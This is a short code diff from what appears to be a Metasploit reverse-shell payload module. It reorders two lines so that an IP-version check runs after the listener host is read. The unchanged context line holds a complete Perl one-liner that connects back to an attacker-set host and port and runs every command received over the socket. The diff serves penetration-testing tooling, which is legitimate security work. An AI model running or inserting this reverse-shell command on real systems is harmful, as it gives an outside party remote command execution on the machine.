@@ -51,8 +51,8 @@ module Metasploit3
 	# Returns the command string to use for execution
 	#
 	def command_string
-		ver   = Rex::Socket.is_ipv6?(lhost) ? "6" : ""
 		lhost = datastore['LHOST']
+		ver   = Rex::Socket.is_ipv6?(lhost) ? "6" : ""
 		lhost = "[#{lhost}]" if Rex::Socket.is_ipv6?(lhost)
 		cmd   = "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET#{ver}(PeerAddr,\"#{lhost}:#{datastore['LPORT']}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"
 	end
